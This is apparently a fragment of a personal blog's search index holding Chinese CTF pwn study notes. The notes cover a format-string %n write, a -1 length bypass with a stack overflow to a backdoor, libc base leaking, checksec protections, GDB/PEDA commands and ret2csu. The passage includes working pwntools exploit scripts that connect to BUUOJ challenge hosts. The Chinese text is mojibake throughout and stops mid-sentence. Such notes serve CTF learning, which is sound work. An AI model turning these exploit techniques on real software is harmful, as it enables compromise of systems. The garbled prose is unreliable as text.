ç„¶åæˆ‘ä»¬éœ€è¦çŸ¥é“ç¬¬å‡ ä¸ªå‚æ•°å­˜å‚¨äº†æˆ‘ä»¬å†™å…¥çš„æ ¼å¼å­—ç¬¦ä¸²\u0026mdash;-\u0026gt;åœ¨ gdb ä¸­ç”¨ a*n æ¥æ‰¾ã€‚ é‚£ä¹ˆæ¥æ„é€ è¾“å…¥çš„æ ¼å¼åŒ–å­—ç¬¦ä¸² 0x0804A02C%11$n å‰é¢çš„æ˜¯ x çš„åœ°å€ï¼ˆIDA çœ‹å‡ºæ¥çš„ï¼‰ï¼Œ11 æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²å­˜å‚¨ä½ç½®ï¼ˆgdb çœ‹å‡ºæ¥çš„ï¼‰ Exp:\n1 2 3 4 5 6 7 8 9 from pwn import * io = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 29563) addr_of_x = 0x0804A02C payload = p32(addr_of_x) + b\u0026#34;%11$n\u0026#34; io.sendline(payload) io.interactive() æ³¨æ„æœ€åä¸éœ€è¦ recvã€‚\n2023.1.31 bjdctf_2020_babystack2 å…³é”®ç‚¹ï¼š-1 ç»•è¿‡é•¿åº¦æ£€æŸ¥ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from pwn import * #start r = remote(\u0026#34;node4.buuoj.cn\u0026#34;,27324) # r = process(\u0026#34;../buu/bjdctf_2020_babystack2\u0026#34;) elf = ELF(\u0026#34;../buu/bjdctf_2020_babystack2\u0026#34;) #params backdoor_addr = elf.symbols[\u0026#39;backdoor\u0026#39;] #attack r.recv() r.sendline(b\u0026#34;-1\u0026#34;) r.recv() payload = b\u0026#39;M\u0026#39;*(0x10+8) + p64(backdoor_addr) r.sendline(payload) r.interactive() ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E5%88%B7%E9%A2%98/","summary":"picoctf_2018_buffer overflow 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * from LibcSearcher import* # context(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; elf = ELF(\u0026#39;./bin/PicoCTF_2018_buffer_overflow_2\u0026#39;) p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 28842) # elf win = elf.symbols[\u0026#39;win\u0026#39;] main_addr = elf.symbols[\u0026#39;main\u0026#39;] a1 = 0x0DEADBEEF a2 = 0x0DEADC0DE print(p.recvline()) payload = b\u0026#39;a\u0026#39; * 0x6c","title":"PWNç®€å•é¢˜é¢˜è§£"},{"content":"ã€ŒäºŒè¿›åˆ¶å®‰å…¨pwnåŸºç¡€ã€ - ç½‘å®‰\nçŸ¥è¯†ç‚¹ [[é™æ€é“¾æ¥æ ˆæº¢å‡º]] å¦‚ä½•å°†ä¸€ä¸ªæ•°è½¬åŒ–ä¸ºåº•å±‚äºŒè¿›åˆ¶çš„æœºå™¨ç ï¼Œæœ€ç®€å•çš„æ–¹å¼å°±æ˜¯åœ¨IDAä¸­ç›´æ¥çœ‹æ±‡ç¼– (80æ¡æ¶ˆæ¯) å †æ¼æ´æŒ–æ˜ä¸­çš„binsåˆ†ç±»(fastbinã€unsorted binã€small binã€large bin)_arena bins_è‘£å“¥çš„é»‘æ¿æŠ¥çš„åšå®¢-CSDNåšå®¢ fastbin å¤§å°åœ¨32å­—èŠ‚~128å­—èŠ‚ï¼ˆ0x20~0x80ï¼‰ unsorted bin å¯¹chunkçš„å¤§å°å¹¶æ²¡æœ‰é™åˆ¶ï¼Œä»»ä½•å¤§å°çš„chunkéƒ½å¯ä»¥å½’å±åˆ°unsorted binä¸­ small bin å°äº1024å­—èŠ‚ï¼ˆ0x400ï¼‰çš„chunk large bin å¤§äºç­‰äº1024å­—èŠ‚ï¼ˆ0x400ï¼‰çš„chunk (80æ¡æ¶ˆæ¯) å †æ¼æ´æŒ–æ˜ä¸­chunkçš„å®é™…å¤§å°ã€æœ€ä½å¤§å°ã€ mchunk_sizeæˆå‘˜_ä¸ºä»€ä¹ˆç”³è¯·çš„å †å—å¤§å°ä¼šå¤šåŠ 0x10_è‘£å“¥çš„é»‘æ¿æŠ¥çš„åšå®¢-CSDNåšå®¢ å½“ç”¨æˆ·ç”³è¯·sizeå¤§å°çš„å †å—æ—¶ï¼Œåœ¨glibcä¸­æœ¬è´¨ä¸Šæ˜¯ç”³è¯·äº†size+16å¤§å°ï¼ˆ64ä½ç³»ç»Ÿä¸­ï¼‰çš„å†…å­˜ï¼Œå› ä¸ºè¦åŠ ä¸Šå‰ä¸¤ä¸ªæˆå‘˜ ä¾‹å¦‚ï¼šmalloc(0x10);ç”³è¯·äº†0x10å¤§å°çš„å †å†…å­˜ï¼Œæœ¬è´¨ä¸Šåœ¨glibcä¸­ç”³è¯·äº†0x10+0x10=0x20å¤§å°çš„ç©ºé—´ã€‚ shellcode=asm(shellcraft.sh()) (68æ¡æ¶ˆæ¯) å †ä¸­å„ä¸ªé‡è¦å‚æ•°çš„æ„ä¹‰ï¼ˆç”¨äºå­¦ä¹ å…¥é—¨ä¸ªäººè®°å½•ï¼‰_æœˆé˜´è’çš„åšå®¢-CSDNåšå®¢ 64 ä½è®°å¾—ç”¨å¯„å­˜å™¨ï¼Œ32 ä½ä¼ å‚æ˜¯åœ¨æ ˆä¸Š 64ä½æ±‡ç¼–ä¼ å‚ï¼Œå½“å‚æ•°å°‘äº7ä¸ªæ—¶ï¼Œ å‚æ•°ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨: rdi, rsi, rdx, rcx, r8, r9ã€‚ å½“å‚æ•°ä¸º7ä¸ªä»¥ä¸Šæ—¶ï¼Œ å‰ 6 ä¸ªä¸å‰é¢ä¸€æ ·ï¼Œ ä½†åé¢çš„ä¾æ¬¡ä» â€œå³å‘å·¦â€ æ”¾å…¥æ ˆä¸­ï¼Œå³å’Œ32ä½æ±‡ç¼–ä¸€æ · è¦æ‡‚å¾—å¤šè¯•å‡ ä¸ªï¼Œè¿™é“é¢˜çš„ printf_got ç”¨ä¸äº†ï¼Œé‚£å°±æ¢æˆ read å…³äºä¸¤ç§ libc 1 2 3 4 5 6 7 8 libc_base = read_addr - libc.symbols[\u0026#34;read\u0026#34;] system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] str_bin_sh = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() # libc = LibcSearcher(\u0026#39;printf\u0026#39;, printf_addr) # libc_base = printf_addr - libc.dump(\u0026#34;printf\u0026#34;) # system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # str_bin_sh = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) å…³äºæ¥æ”¶åœ°å€ 1 2 3 4 5 6 #32ä½ç”¨è¿™ä¸ª print(p.recvuntil(\u0026#39;\\n\u0026#39;)) read_addr = u32(p.recv(4)) #64ä½ç”¨è¿™ä¸ª read_addr = u64(p.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) print(hex(read_addr)) å¯¹retæ ˆå¯¹é½çš„è§£é‡Š Ubuntu18ä»¥ä¸Šç³»ç»Ÿ64ä½çš„glibcçš„payloadè°ƒç”¨systemå‡½æ•°æ—¶ï¼Œæ‰€éœ€æ³¨æ„çš„å †æ ˆå¹³è¡¡é—®é¢˜ - PiCpoçš„é˜æ¥¼\nå¸¸è§çš„å¯„å­˜å™¨ sp/esp/rspï¼ˆ16bit/32bit/64bitï¼‰æ ˆå¯„å­˜å™¨\u0026mdash;æŒ‡å‘æ ˆé¡¶ bp/ebp/rbp æ ˆåŸºå€å¯„å­˜å™¨\u0026mdash;æŒ‡å‘æ ˆåº• ip/eip/rip ç¨‹åºæŒ‡ä»¤å¯„å­˜å™¨\u0026mdash;æŒ‡å‘ä¸‹ä¸€æ¡å¾…æ‰§è¡ŒæŒ‡ä»¤ å·¥å…· checksec checksec -file=filename checksecå·¥å…·ä½¿ç”¨-pwn - ç®€ä¹¦ (jianshu.com)\nArchï¼šç¨‹åºçš„æ¶æ„ä¿¡æ¯ã€‚åˆ¤æ–­æ˜¯æ‹–è¿›64ä½IDAè¿˜æ˜¯32ä½ï¼Ÿexpç¼–å†™æ—¶p64è¿˜æ˜¯p32å‡½æ•°ï¼Ÿ RELROï¼šRelocation Read-Only (RELRO) æ­¤é¡¹æŠ€æœ¯ä¸»è¦é’ˆå¯¹ GOT æ”¹å†™çš„æ”»å‡»æ–¹å¼ã€‚å®ƒåˆ†ä¸ºä¸¤ç§ï¼ŒPartial RELRO å’Œ Full RELROã€‚ Stack-canaryï¼šæ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼Œå½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®©shellcodeèƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œã€‚å½“å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥ç±»ä¼¼cookieçš„ä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxä¸­æˆ‘ä»¬å°†cookieä¿¡æ¯ç§°ä¸ºcanaryã€‚ **NXï¼š**NX enabledå¦‚æœè¿™ä¸ªä¿æŠ¤å¼€å¯å°±æ˜¯æ„å‘³ç€æ ˆä¸­æ•°æ®æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œå¦‚æ­¤ä¸€æ¥, å½“æ”»å‡»è€…åœ¨å †æ ˆä¸Šéƒ¨ç½²è‡ªå·±çš„ shellcode å¹¶è§¦å‘æ—¶, åªä¼šç›´æ¥é€ æˆç¨‹åºçš„å´©æºƒï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨ropè¿™ç§æ–¹æ³•ç»•è¿‡ PIEï¼šPIE(Position-Independent Executable, ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶)æŠ€æœ¯ä¸ ASLR æŠ€æœ¯ç±»ä¼¼,ASLR å°†ç¨‹åºè¿è¡Œæ—¶çš„å †æ ˆä»¥åŠå…±äº«åº“çš„åŠ è½½åœ°å€éšæœºåŒ–, è€Œ PIE æŠ€æœ¯åˆ™åœ¨ç¼–è¯‘æ—¶å°†ç¨‹åºç¼–è¯‘ä¸ºä½ç½®æ— å…³, å³ç¨‹åºè¿è¡Œæ—¶å„ä¸ªæ®µï¼ˆå¦‚ä»£ç æ®µç­‰ï¼‰åŠ è½½çš„è™šæ‹Ÿåœ°å€ä¹Ÿæ˜¯åœ¨è£…è½½æ—¶æ‰ç¡®å®šã€‚è¿™å°±æ„å‘³ç€, åœ¨ PIE å’Œ ASLR åŒæ—¶å¼€å¯çš„æƒ…å†µä¸‹, æ”»å‡»è€…å°†å¯¹ç¨‹åºçš„å†…å­˜å¸ƒå±€ä¸€æ— æ‰€çŸ¥, ä¼ ç»Ÿçš„æ”¹å†™GOT è¡¨é¡¹çš„æ–¹æ³•ä¹Ÿéš¾ä»¥è¿›è¡Œ, å› ä¸ºæ”»å‡»è€…ä¸èƒ½è·å¾—ç¨‹åºçš„.got æ®µçš„è™šåœ°å€ã€‚ è‹¥å¼€å¯ä¸€èˆ¬éœ€åœ¨æ”»å‡»æ—¶æ³„éœ²åœ°å€ä¿¡æ¯ RPATH/RUNPATHï¼šç¨‹åºè¿è¡Œæ—¶çš„ç¯å¢ƒå˜é‡ï¼Œè¿è¡Œæ—¶æ‰€éœ€è¦çš„å…±äº«åº“æ–‡ä»¶ä¼˜å…ˆä»è¯¥ç›®å½•å¯»æ‰¾ï¼Œå¯ä»¥fake libé€ æˆæ”»å‡» FORTIFYï¼šè¿™æ˜¯ä¸€ä¸ªç”±GCCå®ç°çš„æºç çº§åˆ«çš„ä¿æŠ¤æœºåˆ¶ï¼Œå…¶åŠŸèƒ½æ˜¯åœ¨ç¼–è¯‘çš„æ—¶å€™æ£€æŸ¥æºç ä»¥é¿å…æ½œåœ¨çš„ç¼“å†²åŒºæº¢å‡ºç­‰é”™è¯¯ã€‚ç®€å•åœ°è¯´ï¼ŒåŠ äº†è¿™ä¸ªä¿æŠ¤ä¹‹å,ä¸€äº›æ•æ„Ÿå‡½æ•°å¦‚read, fgets,memcpy, printfç­‰ç­‰å¯èƒ½å¯¼è‡´æ¼æ´å‡ºç°çš„å‡½æ•°éƒ½ä¼šè¢«æ›¿æ¢æˆ**read_chk,**fgets_chk, memcpy_chk, printf_chkç­‰ã€‚è¿™äº›å¸¦äº†chkçš„å‡½æ•°ä¼šæ£€æŸ¥è¯»å–/å¤åˆ¶çš„å­—èŠ‚é•¿åº¦æ˜¯å¦è¶…è¿‡ç¼“å†²åŒºé•¿åº¦ï¼Œé€šè¿‡æ£€æŸ¥è¯¸å¦‚%nä¹‹ç±»çš„å­—ç¬¦ä¸²ä½ç½®æ˜¯å¦ä½äºå¯èƒ½è¢«ç”¨æˆ·ä¿®æ”¹çš„å¯å†™åœ°å€ï¼Œé¿å…äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²è·³è¿‡æŸäº›å‚æ•°ï¼ˆå¦‚ç›´æ¥%7$xï¼‰ç­‰æ–¹å¼æ¥é¿å…æ¼æ´å‡ºç°ã€‚å¼€å¯äº†FORTIFYä¿æŠ¤çš„ç¨‹åºä¼šè¢«checksecæ£€å‡ºï¼Œæ­¤å¤–ï¼Œåœ¨åæ±‡ç¼–æ—¶ç›´æ¥æŸ¥çœ‹gotè¡¨ä¹Ÿä¼šå‘ç°chkå‡½æ•°çš„å­˜åœ¨ã€‚ GDB aslr â€“ æŸ¥çœ‹ GDB çš„ ASLR è®¾ç½® checksec â€“ æŸ¥çœ‹å„ç§å®‰å…¨é…ç½® dumpargs â€“ æ˜¾ç¤ºå‡½æ•°çš„ä¼ å‚ï¼Œå½“åœ¨ call æŒ‡ä»¤å¤„æ–­ä¸‹æ—¶ dumprop â€“ Dump æ‰€æœ‰ ROP gadgets åœ¨ç‰¹å®šçš„å†…å­˜èŒƒå›´ elfheader â€“ è·å– header çš„ä¿¡æ¯ elfsymbol â€“ è·å– non-debugging çš„ç¬¦å·ä¿¡æ¯ lookup â€“ åœ¨æŒ‡å®šåœ°å€èŒƒå›´å†…æŸ¥æ‰¾åœ°å€å¼•ç”¨ patch â€“ åœ¨å†…å­˜å¼€å§‹å¤„ (with string/hexstring/int) Patch pattern â€“ å†…å­˜å¾ªç¯æ¨¡å¼çš„æ“ä½œ procinfo â€“ åœ¨ /proc/pid/ æ˜¾ç¤ºå„ç§ä¿¡æ¯ pshow â€“ æ˜¾ç¤ºå„ç§ PEDA æ“ä½œå’Œå…¶ä»–çš„è®¾ç½® pset â€“ è®¾ç½®å„ç§ PEDA çš„æ“ä½œå’Œå…¶ä»–é…ç½® readelf â€“ è·å– elf æ–‡ä»¶ header ä¿¡æ¯ ropgadget â€“ è·å– ROP gadgets (äºŒè¿›åˆ¶æˆ–è€…åº“) ropsearch â€“ åœ¨å†…å­˜ä¸­æŸ¥æ‰¾ ROP gadgets searchmem|find â€“ å¯»æ‰¾å†…å­˜çš„ patternï¼Œæ”¯æŒ regex æŸ¥æ‰¾ shellcode â€“ ç”Ÿæˆæˆ–è€…ä¸‹è½½å¸¸è§çš„ shellcodes skeleton â€“ ç”Ÿæˆ python åˆ©ç”¨æ¼æ´æ¨¡æ¿ vmmap â€“ è·å¾— section çš„è™šæ‹Ÿæ˜ å°„åœ°å€èŒƒå›´ xormem â€“ XOR a memory region with a key é€šè¿‡ key XOR ä¸€ä¸ªå†…å­˜åŸŸ\nX æ£€æŸ¥å†…å­˜ï¼Œå¸¸ç”¨ã€‚ x/nfu x n, f, å’Œ u éƒ½æ˜¯å¯é€‰å‚æ•°ï¼Œç”¨äºæŒ‡å®šè¦æ˜¾ç¤ºçš„å†…å­˜ä»¥åŠå¦‚ä½•æ ¼å¼åŒ–ã€‚ addr æ˜¯è¦å¼€å§‹æ˜¾ç¤ºå†…å­˜çš„åœ°å€çš„è¡¨è¾¾å¼ã€‚ n é‡å¤æ¬¡æ•°ï¼ˆé»˜è®¤å€¼æ˜¯ 1ï¼‰ï¼ŒæŒ‡å®šè¦æ˜¾ç¤ºå¤šå°‘ä¸ªå•ä½ï¼ˆç”± u æŒ‡å®šï¼‰çš„å†…å­˜å€¼ã€‚ f æ˜¾ç¤ºæ ¼å¼ï¼ˆåˆå§‹é»˜è®¤å€¼æ˜¯ xï¼‰ï¼Œæ˜¾ç¤ºæ ¼å¼æ˜¯ print(\u0026lsquo;x\u0026rsquo;ï¼Œ\u0026rsquo;d\u0026rsquo;ï¼Œ\u0026lsquo;u\u0026rsquo;ï¼Œ\u0026lsquo;o\u0026rsquo;ï¼Œ\u0026rsquo;t\u0026rsquo;ï¼Œ\u0026lsquo;a\u0026rsquo;ï¼Œ\u0026lsquo;c\u0026rsquo;ï¼Œ\u0026lsquo;f\u0026rsquo;ï¼Œ\u0026rsquo;s\u0026rsquo;) ä½¿ç”¨çš„æ ¼å¼ä¹‹ä¸€ï¼Œå†åŠ  iï¼ˆæœºå™¨æŒ‡ä»¤ï¼‰ã€‚ u å•ä½å¤§å°ï¼Œb è¡¨ç¤ºå•å­—èŠ‚ï¼Œh è¡¨ç¤ºåŒå­—èŠ‚ï¼Œw è¡¨ç¤ºå››å­—èŠ‚ï¼Œg è¡¨ç¤ºå…«å­—èŠ‚ã€‚ disassembleï¼ˆç®€å†™ï¼šdisasï¼‰ disas åæ±‡ç¼–æŒ‡å®šå‡½æ•° disas åæ±‡ç¼–æŸåœ°å€æ‰€åœ¨å‡½æ•° disas \u0026lt;begin_addr\u0026gt; \u0026lt;end_addr\u0026gt; åæ±‡ç¼–ä»å¼€å§‹åœ°å€åˆ°ç»“æŸåœ°å€çš„éƒ¨åˆ† backtraceï¼ˆç®€å†™ï¼šbtï¼‰ æ ˆå›æº¯ bt æ‰“å°æ•´ä¸ªæ ˆçš„å›æº¯ï¼Œæ¯ä¸ªæ ˆå¸§ä¸€è¡Œã€‚ bt n ç±»ä¼¼äºä¸Šï¼Œä½†åªæ‰“å°æœ€å†…å±‚çš„ n ä¸ªæ ˆå¸§ã€‚ bt -n ç±»ä¼¼äºä¸Šï¼Œä½†åªæ‰“å°æœ€å¤–å±‚çš„ n ä¸ªæ ˆå¸§ã€‚ bt full n ç±»ä¼¼äº bt nï¼Œè¿˜æ‰“å°å±€éƒ¨å˜é‡çš„å€¼ã€‚ èµ„æ–™ [åŸåˆ›][æ–°æ‰‹å‘] ä¸€æ­¥ä¸€æ­¥å­¦pwntools-Pwn-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/pwn%E7%BB%86%E7%A2%8E%E7%9F%A5%E8%AF%86/","summary":"ã€ŒäºŒè¿›åˆ¶å®‰å…¨pwnåŸºç¡€ã€ - ç½‘å®‰ çŸ¥è¯†ç‚¹ [[é™æ€é“¾æ¥æ ˆæº¢å‡º]] å¦‚ä½•å°†ä¸€ä¸ªæ•°è½¬åŒ–ä¸ºåº•å±‚äºŒè¿›åˆ¶çš„æœºå™¨ç ï¼Œæœ€ç®€å•çš„æ–¹å¼å°±æ˜¯åœ¨IDAä¸­ç›´æ¥çœ‹æ±‡ç¼– (80æ¡","title":"pwnç»†ç¢çŸ¥è¯†"},{"content":"å‚è€ƒï¼š(67æ¡æ¶ˆæ¯) ä¸­çº§ROPä¹‹ret2csu_è¥¿æ­çš„åšå®¢-CSDNåšå®¢\né€‚ç”¨åœºæ™¯ åœ¨æˆ‘ä»¬æƒ³è¦è°ƒç”¨ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ–è€…åœ¨ 64 ä½ç¨‹åºä¸­é€šè¿‡å¯„å­˜å™¨ä¼ é€’å‚æ•°ï¼Œéœ€è¦è®¾ç½®å¯„å­˜å™¨ä¸­çš„å€¼ï¼Œä½†æ˜¯æœ‰çš„æ—¶å€™å¯èƒ½æ²¡æœ‰æœåˆ°è¶³å¤Ÿ gadgets æ¥å¯¹å¯„å­˜å™¨è®¾ç½®å€¼ã€‚è¿™ä¸ªæ—¶å€™éœ€è¦ csu å‡½æ•°ã€‚\næ¦‚è¿° __libc_csu_init å‡½æ•°æ˜¯ç”¨æ¥å¯¹ libc è¿›è¡Œåˆå§‹åŒ–æ“ä½œçš„ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨ libc å‡½æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°ä¸€å®šä¼šå­˜åœ¨ã€‚æˆ‘ä»¬å¯ä»¥æ„é€ æ ˆçš„åˆ†å¸ƒï¼Œç„¶åæ§åˆ¶ç¨‹åºè·³è½¬åˆ° csuï¼Œå°†å¯„å­˜å™¨çš„å€¼è®¾ç½®ä¸ºæ‰€éœ€è¦çš„å€¼ã€‚\nåŸç† __libc_csu_init å‡½æ•°çš„æ±‡ç¼–æŒ‡ä»¤ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 .text:00000000004011B0 ; void _libc_csu_init(void) .text:00000000004011B0 public __libc_csu_init .text:00000000004011B0 __libc_csu_init proc near ; DATA XREF: _start+16â†‘o .text:00000000004011B0 ; __unwind { .text:00000000004011B0 push r15 .text:00000000004011B2 mov r15, rdx .text:00000000004011B5 push r14 .text:00000000004011B7 mov r14, rsi .text:00000000004011BA push r13 .text:00000000004011BC mov r13d, edi .text:00000000004011BF push r12 .text:00000000004011C1 lea r12, __frame_dummy_init_array_entry .text:00000000004011C8 push rbp .text:00000000004011C9 lea rbp, __do_global_dtors_aux_fini_array_entry .text:00000000004011D0 push rbx .text:00000000004011D1 sub rbp, r12 .text:00000000004011D4 sub rsp, 8 .text:00000000004011D8 call _init_proc .text:00000000004011DD sar rbp, 3 .text:00000000004011E1 jz short loc_4011FE .text:00000000004011E3 xor ebx, ebx .text:00000000004011E5 nop dword ptr [rax] .text:00000000004011E8 .text:00000000004011E8 loc_4011E8: ; CODE XREF: __libc_csu_init+4Câ†“j .text:00000000004011E8 mov rdx, r15 .text:00000000004011EB mov rsi, r14 .text:00000000004011EE mov edi, r13d .text:00000000004011F1 call qword ptr [r12+rbx*8] .text:00000000004011F5 add rbx, 1 .text:00000000004011F9 cmp rbp, rbx .text:00000000004011FC jnz short loc_4011E8 .text:00000000004011FE .text:00000000004011FE loc_4011FE: ; CODE XREF: __libc_csu_init+31â†‘j .text:00000000004011FE add rsp, 8 .text:0000000000401202 pop rbx .text:0000000000401203 pop rbp .text:0000000000401204 pop r12 .text:0000000000401206 pop r13 .text:0000000000401208 pop r14 .text:000000000040120A pop r15 .text:000000000040120C retn .text:000000000040120C ; } // starts at 4011B0 .text:000000000040120C __libc_csu_init endp å¯ä»¥çœ‹åˆ° csu å‡½æ•°æœ‰ä¸‰æ®µä»£ç ï¼Œæˆ‘ä»¬ç”¨åˆ°çš„æ˜¯åé¢ä¸¤æ®µã€‚ loc_4011FE æ®µå…¨æ˜¯ popï¼Œæ‰€ä»¥è¿™æ®µä»£ç å¯ä»¥å°†æˆ‘ä»¬æ„é€ çš„æ ˆä¸­çš„å€¼å…¨éƒ¨å­˜å…¥ rbx, rbp, r12, r13, r14, r15å¯„å­˜å™¨ä¸­ loc_4011E8 æ®µä¼šæ¯”è¾ƒå¤æ‚ä¸€ç‚¹ï¼š\né¦–å…ˆä¸‰æ®µ mov æŒ‡ä»¤å°†å­˜å‚¨åœ¨ r15çš„å€¼èµ‹ç»™ rdxï¼Œå­˜å‚¨åœ¨ r14çš„å€¼èµ‹ç»™ rsiï¼Œå­˜å‚¨åœ¨ r13çš„å€¼èµ‹ç»™ ediï¼Œæ­¤æ—¶ rdi çš„é«˜32ä½å¯„å­˜å™¨ä¸­å€¼ä¸º0ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥æ§åˆ¶ rdi çš„å€¼ã€‚ ç„¶å call æŒ‡ä»¤è·³è½¬åˆ° r12å¯„å­˜å™¨å­˜å‚¨çš„ä½ç½®å¤„ï¼ˆåœ¨ gadgets1ä¸­ç½® rbx=0ï¼‰ rbx+1ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ rbp ç›¸ç­‰ï¼Œå¦åˆ™é‡æ–°æ‰§è¡Œ gadgets2ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸ºäº†ä¸é‡æ–°æ‰§è¡Œï¼Œå°† rbp ç½®ä¸º1 åˆ©ç”¨æ–¹æ³• æˆ‘ä»¬é¦–å…ˆæ§åˆ¶ç¨‹åºè·³è½¬åˆ° loc_4011FE æ®µï¼Œç„¶åé€šè¿‡æœ«å°¾çš„ ret è·³è½¬åˆ° loc_4011E8 æ®µã€‚å½“ç¨‹åºæ‰§è¡Œç»“æŸ loc_4011E8 åä¼šç»§ç»­é¡ºåºæ‰§è¡Œ loc_4011FE ç«¯ï¼Œä½†æ˜¯æˆ‘ä»¬å·²ç»ä¸éœ€å† pop äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ„é€ æ ˆçš„æ—¶å€™éœ€è¦åœ¨æœ‰ç”¨çš„å€¼åé¢æ¥ç€è·Ÿä¸Šé•¿åº¦ä¸€æ ·çš„ padding ç”¨äºç¬¬äºŒæ¬¡çš„ popã€‚\næ³¨æ„è¿™é‡Œçš„ padding æ˜¯ 56 ä¸ªå­—èŠ‚ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥æ˜¯ 7 ä¸ªï¼Œæ˜æ˜æ˜¯ 6 ä¸ªå¯„å­˜å™¨ï¼‰ åœ¨æ„é€ æ ˆçš„æ—¶å€™éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œrdi ä¸ºç¬¬ä¸€ä¸ªå‚æ•°çš„å­˜æ”¾å¯„å­˜å™¨ï¼Œrsi ä¸ºç¬¬äºŒä¸ªå‚æ•°ï¼Œrdx ä¸ºç¬¬ä¸‰ä¸ªå‚æ•°ã€‚ call å‡½æ•°ä¸ºè·³è½¬åˆ°æŸåœ°å€å†…æ‰€ä¿å­˜çš„åœ°å€ï¼Œåº”è¯¥ä½¿ç”¨ got è¡¨ä¸­çš„åœ°å€ ret æŒ‡ä»¤å¿…é¡»è·³è½¬åˆ°ä¸€æ®µæœ‰æ•ˆçš„æ±‡ç¼–æŒ‡ä»¤ï¼Œæ‰€ä»¥åº”ä¸º plt è¡¨ä¸­çš„åœ°å€ ciscn_2019_s_3 è¿™ä¸ªé¢˜æœ‰ä¸¤ä¸ªè§£æ³•ï¼Œå¯ä»¥é€šè¿‡ ret2csuï¼Œä¹Ÿå¯ä»¥æ˜¯ sropã€‚è¿™é‡Œç»™å‡º ret2csu çš„è§£æ³•ã€‚ é¦–å…ˆæˆ‘ä»¬è§‚å¯Ÿ vuln å‡½æ•°ï¼Œç”¨çš„å…¨æ˜¯ç³»ç»Ÿè°ƒç”¨ï¼Œæ²¡åŠæ³• ret2libcï¼Œä½†æ˜¯æˆ‘ä»¬æ³¨æ„åˆ°å‡ºé¢˜äººç»™äº†ä¸¤ä¸ª gadgetsï¼Œä¸€ä¸ªæ˜¯ execve çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œä¸€ä¸ªæ˜¯ sigretã€‚æ‰€ä»¥æˆ‘ä»¬é€šè¿‡æ ˆæº¢å‡ºæ¥è°ƒç”¨ execve ç³»ç»Ÿè°ƒç”¨ è°ƒç”¨ execve ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½®å‡ ä¸ªå¯„å­˜å™¨ï¼š\nrax = 0x3b rdi = \u0026amp;\u0026rsquo;/bin/sh\\0' rsi = 0 rdx = 0 å·®ä¸€ä¸ª rdxã€‚ æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨åˆ° csu å‡½æ•° ok ç°åœ¨ gadgets å¤Ÿç”¨äº†ï¼Œåªå·®å­—ç¬¦ä¸²â€œbin/shâ€çš„åœ°å€äº†ï¼Œæˆ‘ä»¬å¯ä»¥å†™å…¥æ ˆä¸­ï¼Œç„¶åå°†æ ˆçš„åœ°å€èµ‹ç»™ rdiã€‚æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬è¦å°è¯•æš´éœ²æ ˆåœ°å€ã€‚ æˆ‘ä»¬çŸ¥é“ vuln 